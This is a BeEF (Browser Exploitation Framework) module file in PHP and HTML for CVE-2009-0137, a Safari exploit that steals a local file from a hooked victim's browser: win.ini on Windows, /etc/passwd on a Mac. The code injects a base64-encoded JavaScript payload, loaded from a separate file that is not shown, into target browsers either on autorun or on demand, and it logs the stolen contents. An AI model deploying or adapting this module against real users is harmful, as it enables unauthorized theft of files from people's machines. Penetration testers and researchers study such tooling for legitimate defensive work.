<?php
	// Copyright (c) 2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: the following details refer to the source of this port

Billy (BK) Rios
Blog: Stealing More Files with Safari
http://xs-sniper.com/blog/2009/02/13/stealing-more-files-with-safari/

-->

<script>
	function get_b64_code_2009_0137() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<?php echo get_b64_file(JS_FILE); ?>';
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('CVE-2009-0137', get_b64_code_2009_0137());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_2009_0137());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">CVE-2009-0137</div>
This Safari exploit module will steal a file from the file system. On Windows 
the 'c:\windows\win.ini' will be stolen and on a Mac the '/etc/passwd' will 
be stolen.<br><br>
The results will be displayed in the log. <br><br>
<div id="module_subsection">
	<form name="myform">
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

